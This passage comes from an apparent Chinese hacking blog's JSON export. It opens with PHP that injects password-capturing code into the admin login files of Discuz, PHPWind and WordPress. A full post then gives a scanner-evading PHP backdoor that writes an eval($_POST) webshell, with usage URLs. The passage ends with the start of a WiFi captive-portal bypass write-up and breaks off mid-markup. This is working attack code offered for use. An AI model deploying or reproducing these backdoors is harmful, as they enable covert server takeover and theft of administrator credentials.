class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'dedecms'</span>:</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'dz'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'source/class/class_admincp.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;<span class=\"variable\">$cpgroupid</span> = DB::result_first&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nttttt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'admin_username'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'admin_password'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'phpwind'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'admin/admincp.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;<span class=\"variable\">$REQUEST_URI</span> = trim(<span class=\"variable\">$REQUEST_URI</span>,<span class=\"string\">'?#'</span>);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'admin_name'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'admin_pwd'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'wordpress'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'wp-includes/user.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;<span class=\"variable\">$user</span> = <span class=\"keyword\">new</span> WP_User(<span class=\"variable\">$userdata</span>-&gt;ID);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'log'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'pwd'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">default</span>:</div><div class=\"line\"> ;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"keyword\">return</span> <span class=\"variable\">$code</span>;</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'creack'</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">'creack'</span>] != <span class=\"string\">''</span>){</div><div class=\"line\"> <span class=\"variable\">$webRoot</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">'DOCUMENT_ROOT'</span>]; <span class=\"comment\">//当前目录</span></div><div class=\"line\"> <span class=\"variable\">$dir</span> = <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) ? trim(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) : <span class=\"string\">''</span>;</div><div class=\"line\"> <span class=\"variable\">$cms</span> = <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) ? trim(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) : <span class=\"string\">''</span>;</div><div class=\"line\"> <span class=\"variable\">$cmsCode</span> = switchCms(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]);</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>(<span class=\"variable\">$cmsCode</span>)){</div><div class=\"line\"> <span class=\"variable\">$error</span> = <span class=\"string\">'没找到可用CMS或者BBS'</span>;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$relPath</span> = <span class=\"variable\">$webRoot</span>.<span class=\"variable\">$dir</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'path'</span>];</div><div class=\"line\"> <span class=\"keyword\">if</span>(file_exists(<span class=\"variable\">$relPath</span>)){</div><div class=\"line\"> inSertPwdDoor(<span class=\"variable\">$cmsCode</span>,<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> tipAmessage(<span class=\"string\">'没有找到该文件路径：'</span>.<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> }</div><div class=\"line\"> }</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n","_id":"n99lwvy9ofhvb2py","comments":true,"layout":"post","photos":[],"link":""},{"title":"自己写的一个PHP后门","id":64,"date":1341118684000,"tags":["2191ch4on5ok5nco"],"categories":["ng1ki7p1v08zbwrz"],"content":"<p>今天去连接很久以前的一个shell(目的是做个实验)结果~~被人改密码了。 好吧，你丫的改，看看我怎么收拾你。</p>\n<p>所以就想写一个后门，为啥呢？省的又被改或者删了呗，现在的大马带有后门检测功能。所以为了防止被杀。。。。</p>\n<p>其实这个后门的思路是来自之前在思派尔工作的头，他当时给我看了一个别人的后门结果一看真的很猥琐，</p>\n<p>全部用连接符连接起来的字符串查杀木马的程序在强大也不可能把这个查出来的，所有就有了今天这个后门。</p>\n<h3 id=\"代码：\">代码：</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * PHP后门程序</div><div class=\"line\"> * 使用说明：此程序默认会在当前目录下生成一句话cmd.php密码cmd</div><div class=\"line\"> * 不含有任何敏感函数有它也查不出来所以免杀是必然的。生成的一句</div><div class=\"line\"> * 不是免杀的，要免杀原理已经能看到了，自行处理。</div><div class=\"line\"> * 亲，使用的时候注意删除这里的注释~~</div><div class=\"line\"> * BY: Return Data:2012.6.29</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">scm</span><span class=\"params\">()</span></span>{</div><div class=\"line\"> <span class=\"variable\">$pod</span> = <span class=\"string\">'123'</span>; <span class=\"comment\">//密码</span></div><div class=\"line\"> <span class=\"variable\">$_GET</span>[<span class=\"string\">'ct'</span>] == <span class=\"variable\">$pod</span> ? <span class=\"string\">''</span> : <span class=\"keyword\">exit</span>();</div><div class=\"line\"> <span class=\"variable\">$fcn</span> = <span class=\"string\">'f'</span>.<span class=\"string\">'i'</span>.<span class=\"string\">'l'</span>.<span class=\"string\">'e'</span>.<span class=\"string\">'_'</span>.<span class=\"string\">'p'</span>.<span class=\"string\">'u'</span>.<span class=\"string\">'t'</span>.<span class=\"string\">'_'</span>.<span class=\"string\">'c'</span>.<span class=\"string\">'o'</span>.<span class=\"string\">'n'</span>.<span class=\"string\">'t'</span>.<span class=\"string\">'e'</span>.<span class=\"string\">'n'</span>.<span class=\"string\">'t'</span>.<span class=\"string\">'s'</span>;</div><div class=\"line\"> <span class=\"keyword\">if</span>(@<span class=\"variable\">$_GET</span>[<span class=\"string\">'sf'</span>]==<span class=\"string\">'yes'</span>){</div><div class=\"line\"> <span class=\"variable\">$fnm</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">'filepath'</span>];</div><div class=\"line\"> <span class=\"variable\">$fct</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">'content'</span>];</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$fnm</span> = <span class=\"string\">'c'</span>.<span class=\"string\">'m'</span>.<span class=\"string\">'d'</span>.<span class=\"string\">'.'</span>.<span class=\"string\">'p'</span>.<span class=\"string\">'h'</span>.<span class=\"string\">'p'</span>;</div><div class=\"line\"> <span class=\"variable\">$fct</span> = <span class=\"string\">'&lt;'</span>.<span class=\"string\">'?'</span>.<span class=\"string\">'p'</span>.<span class=\"string\">'h'</span>.<span class=\"string\">'p'</span>.<span class=\"string\">' @'</span>.<span class=\"string\">'e'</span>.<span class=\"string\">'v'</span>.<span class=\"string\">'a'</span>.<span class=\"string\">'l'</span>.<span class=\"string\">'('</span>.<span class=\"string\">'$'</span>.<span class=\"string\">'_'</span>.<span class=\"string\">'P'</span>.<span class=\"string\">'O'</span>.<span class=\"string\">'S'</span>.<span class=\"string\">'T'</span>.<span class=\"string\">'['</span>.<span class=\"string\">'&quot;'</span>.<span class=\"string\">'c'</span>.<span class=\"string\">'m'</span>.<span class=\"string\">'d'</span>.<span class=\"string\">'&quot;'</span>.<span class=\"string\">']'</span>.<span class=\"string\">')'</span>.<span class=\"string\">'?'</span>.<span class=\"string\">'&gt;'</span>;</div><div class=\"line\"> }</div><div class=\"line\"> @<span class=\"variable\">$fcn</span>(<span class=\"variable\">$fnm</span>, <span class=\"variable\">$fct</span>);</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">'succeed!'</span>;</div><div class=\"line\">}</div><div class=\"line\">scm();</div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<p><a id=\"more\"></a></p>\n<h2 id=\"使用方法：\">使用方法：</h2>\n<p>参数：ct 为密码 ，sf 为是否使用自定义内容，</p>\n<p>filepath 自定义文件路径，content 自定义文件内容</p>\n<p>自带后门生成方法 ： door.php?ct=密码</p>\n<p>自定义后门生成方法： door.php?ct=密码&amp;sf=yes&amp;filepath=文件路径&amp;content=文件内容</p>\n<p>注意：</p>\n<p>自动生成后门会在当前目录下生成一个cmd.php密码为cmd的一句话，怎么使用一句话？</p>\n<p>菜刀连接，你懂得~~</p>\n","source":"_posts/自己写的一个php后门.md","raw":"title: \"自己写的一个PHP后门\"\nid: 64\ndate: 2012-07-01 12:58:04\ntags: \n- 后门\ncategories: \n- 原创作品\n---\n\n今天去连接很久以前的一个shell(目的是做个实验)结果~~被人改密码了。 好吧，你丫的改，看看我怎么收拾你。\n\n所以就想写一个后门，为啥呢？省的又被改或者删了呗，现在的大马带有后门检测功能。所以为了防止被杀。。。。\n\n其实这个后门的思路是来自之前在思派尔工作的头，他当时给我看了一个别人的后门结果一看真的很猥琐，\n\n全部用连接符连接起来的字符串查杀木马的程序在强大也不可能把这个查出来的，所有就有了今天这个后门。\n\n###代码：\n\n```php\n\n<?php\n/*\n * PHP后门程序\n * 使用说明：此程序默认会在当前目录下生成一句话cmd.php密码cmd\n * 不含有任何敏感函数有它也查不出来所以免杀是必然的。生成的一句\n * 不是免杀的，要免杀原理已经能看到了，自行处理。\n * 亲，使用的时候注意删除这里的注释~~\n * BY: Return Data:2012.6.29\n */\nfunction scm(){\n $pod = '123'; //密码\n $_GET['ct'] == $pod ? '' : exit();\n $fcn = 'f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';\n if(@$_GET['sf']=='yes'){\n $fnm = $_GET['filepath'];\n $fct = $_GET['content'];\n }else{\n $fnm = 'c'.'m'.'d'.'.'.'p'.'h'.'p';\n $fct = '<'.'?'.'p'.'h'.'p'.' @'.'e'.'v'.'a'.'l'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'['.'&quot;'.'c'.'m'.'d'.'&quot;'.']'.')'.'?'.'>';\n }\n @$fcn($fnm, $fct);\n echo 'succeed!';\n}\nscm();\n?>\n```\n<!--more-->\n##使用方法：\n\n参数：ct 为密码 ，sf 为是否使用自定义内容，\n\nfilepath 自定义文件路径，content 自定义文件内容\n\n自带后门生成方法 ： door.php?ct=密码\n\n自定义后门生成方法： door.php?ct=密码&amp;sf=yes&amp;filepath=文件路径&amp;content=文件内容\n\n注意：\n\n自动生成后门会在当前目录下生成一个cmd.php密码为cmd的一句话，怎么使用一句话？\n\n菜刀连接，你懂得~~\n","slug":"自己写的一个php后门","updated":1421659126000,"excerpt":"<p>今天去连接很久以前的一个shell(目的是做个实验)结果~~被人改密码了。 好吧，你丫的改，看看我怎么收拾你。</p>\n<p>所以就想写一个后门，为啥呢？省的又被改或者删了呗，现在的大马带有后门检测功能。所以为了防止被杀。。。。</p>\n<p>其实这个后门的思路是来自之前在思派尔工作的头，他当时给我看了一个别人的后门结果一看真的很猥琐，</p>\n<p>全部用连接符连接起来的字符串查杀木马的程序在强大也不可能把这个查出来的，所有就有了今天这个后门。</p>\n<h3 id=\"代码：\">代码：</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * PHP后门程序</div><div class=\"line\"> * 使用说明：此程序默认会在当前目录下生成一句话cmd.php密码cmd</div><div class=\"line\"> * 不含有任何敏感函数有它也查不出来所以免杀是必然的。生成的一句</div><div class=\"line\"> * 不是免杀的，要免杀原理已经能看到了，自行处理。</div><div class=\"line\"> * 亲，使用的时候注意删除这里的注释~~</div><div class=\"line\"> * BY: Return Data:2012.6.29</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">scm</span><span class=\"params\">()</span></span>{</div><div class=\"line\"> <span class=\"variable\">$pod</span> = <span class=\"string\">'123'</span>; <span class=\"comment\">//密码</span></div><div class=\"line\"> <span class=\"variable\">$_GET</span>[<span class=\"string\">'ct'</span>] == <span class=\"variable\">$pod</span> ? <span class=\"string\">''</span> : <span class=\"keyword\">exit</span>();</div><div class=\"line\"> <span class=\"variable\">$fcn</span> = <span class=\"string\">'f'</span>.<span class=\"string\">'i'</span>.<span class=\"string\">'l'</span>.<span class=\"string\">'e'</span>.<span class=\"string\">'_'</span>.<span class=\"string\">'p'</span>.<span class=\"string\">'u'</span>.<span class=\"string\">'t'</span>.<span class=\"string\">'_'</span>.<span class=\"string\">'c'</span>.<span class=\"string\">'o'</span>.<span class=\"string\">'n'</span>.<span class=\"string\">'t'</span>.<span class=\"string\">'e'</span>.<span class=\"string\">'n'</span>.<span class=\"string\">'t'</span>.<span class=\"string\">'s'</span>;</div><div class=\"line\"> <span class=\"keyword\">if</span>(@<span class=\"variable\">$_GET</span>[<span class=\"string\">'sf'</span>]==<span class=\"string\">'yes'</span>){</div><div class=\"line\"> <span class=\"variable\">$fnm</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">'filepath'</span>];</div><div class=\"line\"> <span class=\"variable\">$fct</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">'content'</span>];</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$fnm</span> = <span class=\"string\">'c'</span>.<span class=\"string\">'m'</span>.<span class=\"string\">'d'</span>.<span class=\"string\">'.'</span>.<span class=\"string\">'p'</span>.<span class=\"string\">'h'</span>.<span class=\"string\">'p'</span>;</div><div class=\"line\"> <span class=\"variable\">$fct</span> = <span class=\"string\">'&lt;'</span>.<span class=\"string\">'?'</span>.<span class=\"string\">'p'</span>.<span class=\"string\">'h'</span>.<span class=\"string\">'p'</span>.<span class=\"string\">' @'</span>.<span class=\"string\">'e'</span>.<span class=\"string\">'v'</span>.<span class=\"string\">'a'</span>.<span class=\"string\">'l'</span>.<span class=\"string\">'('</span>.<span class=\"string\">'$'</span>.<span class=\"string\">'_'</span>.<span class=\"string\">'P'</span>.<span class=\"string\">'O'</span>.<span class=\"string\">'S'</span>.<span class=\"string\">'T'</span>.<span class=\"string\">'['</span>.<span class=\"string\">'&quot;'</span>.<span class=\"string\">'c'</span>.<span class=\"string\">'m'</span>.<span class=\"string\">'d'</span>.<span class=\"string\">'&quot;'</span>.<span class=\"string\">']'</span>.<span class=\"string\">')'</span>.<span class=\"string\">'?'</span>.<span class=\"string\">'&gt;'</span>;</div><div class=\"line\"> }</div><div class=\"line\"> @<span class=\"variable\">$fcn</span>(<span class=\"variable\">$fnm</span>, <span class=\"variable\">$fct</span>);</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">'succeed!'</span>;</div><div class=\"line\">}</div><div class=\"line\">scm();</div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<p>","_id":"hixlhm95f2ftmfig","comments":true,"layout":"post","photos":[],"link":""},{"title":"非https协议web方式wifi认证突破","id":184,"date":1343702621000,"tags":["kuzollxdus91bzni","mqgbzw1xghtp8w0m","wcb9o05ttsfhkasw"],"categories":["1bynalp69sca7b8g"],"content":"<p>转自：法客 deleter</p>\n<p>话说我是个游手好闲的人，趁着暑假四处游荡，投亲靠友。一日来到某校，看有wifi，如饥似渴的打算蹭个小网上上。做好字典破wpa，暴力破</p>\n<p>wep的准备了都，连上wifi就傻眼了，web认证…</p>\n<p>好吧，web认证。既然是web认证，少不了负责验证的服务器。经测试，随便输入一个网址后都会被重定向到A站的一个登陆页面。如果能做手</p>\n<p>脚的话只能在这个页面上搞了。</p>\n<p>know it then hack it。首先找到知情人士，得知开网要提前申请，并且此账户与mac绑定。这就给了我当头一棒。本来想着肯定有很多人密码</p>\n<p>和用户名是一样的，而用户名又是学号，这样写个脚本暴力破解一个一个猜过去就行了。这样的话仅靠猜弱口令来登陆的话是不可能了。</p>\n<p>既然输入网址能被重定向到一个页面，而且此页面所在的服务器是一个公网的ip，那么说，我肯定已经分配好ip了，仅差一个授权。</p>\n<p>既然我已经有了一个ip，我就可以对所在的网段进行嗅探，如果能嗅探到登陆信息说不定还有点门路呢。</p>\n<p>有了大致的思路，开工开工~</p>\n<a id=\"more\"></a>\n\n<p>首先开brup抓本地包。在登陆页面随便输入一个用户名和密码，被brup拦下。数据包内容如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"request\">POST <span class=\"string\">/eportal/webgateuser.do?method=login_ajax_s26_in_out</span> HTTP/1.1</span></div><div class=\"line\"><span class=\"attribute\">Host</span>: <span class=\"string\">x.x.x.x</span></div><div class=\"line\"><span class=\"attribute\">Proxy-Connection</span>: <span class=\"string\">keep-alive</span></div><div class=\"line\"><span class=\"attribute\">Content-Length</span>: <span class=\"string\">3864</span></div><div class=\"line\"><span class=\"attribute\">Cache-Control</span>: <span class=\"string\">max-age=0</span></div><div class=\"line\"><span class=\"attribute\">Origin</span>: <span class=\"string\">http://ooxx</span></div><div class=\"line\"><span class=\"attribute\">User-Agent</span>: <span class=\"string\">Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5</span></div><div class=\"line\"><span class=\"attribute\">Content-Type</span>: <span class=\"string\">application/x-www-form-urlencoded</span></div><div class=\"line\"><span class=\"attribute\">Accept</span>: <span class=\"string\">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></div><div class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: <span class=\"string\">gzip,deflate,sdch</span></div><div class=\"line\"><span class=\"attribute\">Accept-Language</span>: <span class=\"string\">zh-CN,zh;q=0.8</span></div><div class=\"line\"><span class=\"attribute\">Accept-Charset</span>: <span class=\"string\">GBK,utf-8;q=0.7,*;q=0.3</span></div><div class=\"line\"><span class=\"attribute\">Cookie</span>: <span class=\"string\">EPORTAL_COOKIE_USERNAME=3530393031323137; EPORTAL_COOKIE_PASSWORD=3530393031323137; JSESSIONID=77E5D178759BD74801C9FAF8D4B4933F</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"perl\"><span class=\"keyword\">s</span>=<span class=\"number\">69</span>c73394ffea3cc2453dfd4cff2af4a5&amp;t=wireless&amp;ssid=ad3c77575724aefa351ab6744a2a38a<span class=\"number\">0</span>&amp;apmac=<span class=\"number\">6</span>db3d4ac6fdf391878c2635b7bc531fb&amp;mac=<span class=\"number\">56053</span>fdf38ba0a3ba46ad1428f46fe61&amp;port=f8821b8335bb27ee&amp;url=f58cd7a67bbfecbcf3027f3e4bf7b380fb7aa95efe039033&amp;vid=&amp;net_access_type=internet&amp;username=deleter&amp;usernameHidden=deleter&amp;pwd=deleter&amp;seczone=&amp;validcode=no_check&amp;tipinfoHidden=<span class=\"variable\">%3Cdiv</span>+style<span class=\"variable\">%3D</span><span class=\"variable\">%22border</span>-right<span class=\"variable\">%3A</span>+<span class=\"variable\">%23ddd476</span>+<span class=\"number\">1</span>px+solid<span class=\"variable\">%3B</span>+padding-right<span class=\"variable\">%3A</span>+<span class=\"number\">10</span>px<span class=\"variable\">%3B</span>+border-top<span class=\"variable\">%3A</span>+<span class=\"variable\">%23ddd476</span>+<span class=\"number\">1</span>px+solid<span class=\"variable\">%3B</span>+padding-left<span class=\"variable\">%3A</span>+<span class=\"number\">10</span>px<span class=\"variable\">%3B</span>+padding-bottom<span class=\"variable\">%3A</span>+<span class=\"number\">10</span>px<span class=\"variable\">%3B</span>+border-left<span class=\"variable\">%3A</span>+<span class=\"variable\">%23ddd476</span>+<span class=\"number\">1</span>px+solid<span class=\"variable\">%3B</span>+padding-top<span class=\"variable\">%3A</span>+<span class=\"number\">10</span>px<span class=\"variable\">%3B</span>+border-bottom<span class=\"variable\">%3A</span>+<span class=\"variable\">%23ddd476</span>+<span class=\"number\">1</span>px+solid<span class=\"variable\">%3B</span>+height<span class=\"variable\">%3A</span>+<span class=\"number\">90</span>px<span class=\"variable\">%3B</span>+background-color<span class=\"variable\">%3A</span>+<span class=\"variable\">%23fdfadd</span><span class=\"variable\">%3B</span>+text-align<span class=\"variable\">%3A</span>+left<span class=\"variable\">%22</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3Cp</span>+style<span class=\"variable\">%3D</span><span class=\"variable\">%22text</span>-align<span class=\"variable\">%3A</span>+center<span class=\"variable\">%22</span><span class=\"variable\">%3E</span><span class=\"variable\">%3Cspan</span>+style<span class=\"variable\">%3D</span><span class=\"variable\">%22font</span>-weight<span class=\"variable\">%3A</span>+bold<span class=\"variable\">%3B</span>+font-size<span class=\"variable\">%3A</span>+<span class=\"number\">12</span>px<span class=\"variable\">%3B</span>+color<span class=\"variable\">%3A</span>+<span class=\"variable\">%23daa517</span><span class=\"variable\">%3B</span>+line-height<span class=\"variable\">%3A</span>+<span class=\"number\">20</span>px<span class=\"variable\">%22</span><span class=\"variable\">%3E</span><span class=\"variable\">%E4</span><span class=\"variable\">%B8</span><span class=\"variable\">%8A</span><span class=\"variable\">%E7</span><span class=\"variable\">%BD</span><span class=\"variable\">%91</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%A4</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%81</span><span class=\"variable\">%E6</span><span class=\"variable\">%96</span><span class=\"variable\">%B9</span><span class=\"variable\">%E5</span><span class=\"variable\">%BC</span><span class=\"variable\">%8F</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%9A</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fspan</span><span class=\"variable\">%3E</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fp</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3Cp</span>+style<span class=\"variable\">%3D</span><span class=\"variable\">%22color</span><span class=\"variable\">%3A</span>+<span class=\"variable\">%2302ae0a</span><span class=\"variable\">%3B</span>+line-height<span class=\"variable\">%3A</span>+<span class=\"number\">17</span>px<span class=\"variable\">%3B</span>+text-align<span class=\"variable\">%3A</span>+center<span class=\"variable\">%22</span><span class=\"variable\">%3E</span><span class=\"variable\">%E5</span><span class=\"variable\">%85</span><span class=\"variable\">%81</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%B8Web</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%A4</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%81</span><span class=\"variable\">%E6</span><span class=\"variable\">%96</span><span class=\"variable\">%B9</span><span class=\"variable\">%E5</span><span class=\"variable\">%BC</span><span class=\"variable\">%8F</span><span class=\"variable\">%E5</span><span class=\"variable\">%8F</span><span class=\"variable\">%AF</span><span class=\"variable\">%E7</span><span class=\"variable\">%9B</span><span class=\"variable\">%B4</span><span class=\"variable\">%E6</span><span class=\"variable\">%8E</span><span class=\"variable\">%A5</span><span class=\"variable\">%E4</span><span class=\"variable\">%BD</span><span class=\"variable\">%BF</span><span class=\"variable\">%E7</span><span class=\"variable\">%94</span><span class=\"variable\">%A8</span><span class=\"variable\">%E6</span><span class=\"variable\">%9C</span><span class=\"variable\">%AC</span><span class=\"variable\">%E9</span><span class=\"variable\">%A1</span><span class=\"variable\">%B5</span><span class=\"variable\">%E9</span><span class=\"variable\">%9D</span><span class=\"variable\">%A2</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%A4</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%81</span><span class=\"variable\">%EF</span><span class=\"variable\">%BC</span><span class=\"variable\">%8C</span><span class=\"variable\">%E6</span><span class=\"variable\">%97</span><span class=\"variable\">%A0</span><span class=\"variable\">%E9</span><span class=\"variable\">%A1</span><span class=\"variable\">%BB</span><span class=\"variable\">%E4</span><span class=\"variable\">%B8</span><span class=\"variable\">%8B</span><span class=\"variable\">%E8</span><span class=\"variable\">%BD</span><span class=\"variable\">%BD</span><span class=\"variable\">%E5</span><span class=\"variable\">%AE</span><span class=\"variable\">%A2</span><span class=\"variable\">%E6</span><span class=\"variable\">%88</span><span class=\"variable\">%B7</span><span class=\"variable\">%E7</span><span class=\"variable\">%AB</span><span class=\"variable\">%AF</span><span class=\"variable\">%E8</span><span class=\"variable\">%AE</span><span class=\"variable\">%A4</span><span class=\"variable\">%E8</span><span class=\"variable\">%AF</span><span class=\"variable\">%81</span><span class=\"variable\">%E8</span><span class=\"variable\">%BD</span><span class=\"variable\">%AF</span><span class=\"variable\">%E4</span><span class=\"variable\">%BB</span><span class=\"variable\">%B6</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fp</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3Cp</span><span class=\"variable\">%3E</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fp</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3C</span><span class=\"variable\">%2Fdiv</span><span class=\"variable\">%3E</span><span class=\"variable\">%0D</span><span class=\"variable\">%0A</span><span class=\"variable\">%3Cdiv</span>+style<span class=\"variable\">%3D</span><span 